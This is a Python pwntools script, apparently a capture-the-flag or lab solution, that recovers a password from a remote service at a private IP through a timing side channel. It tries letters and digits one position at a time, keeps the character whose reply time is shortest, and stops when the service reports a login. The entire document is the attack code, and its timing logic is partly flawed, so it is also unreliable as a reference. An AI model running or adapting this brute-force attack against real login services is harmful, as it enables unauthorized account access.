#!/usr/bin/python3

from pwn import *
from time import time
from string import *

ip = "192.168.17.129"
port = 54311

sample_space =  ascii_letters + digits

p = remote(ip, port)

current= ''
flag = ""
done = False
min_diff = 0


def chcktime(stng):
	diff = time()
	info = p.recvuntil(b":").decode()
	if 'Password' in  info:
		p.send(stng.encode())
		past_time = time()
		dur = past_time - diff
		diff = time()
	return dur


while not done:
	curr_val = ''
	first = True
	for chars in sample_space:
		current = flag
		current += chars
		ttt = chcktime(current)
		ttt = chcktime(current)
		
		if first:
			min_diff = ttt
			first = False
			
		if ttt < min_diff:
			min_diff = ttt
			curr_val = chars
					
	flag += curr_val
	print(flag)
	
	p.sendlineafter(b":", flag.encode())
	status = p.recvuntil(b"\n")
	
	if b"Logged" in status:
		done = True
	
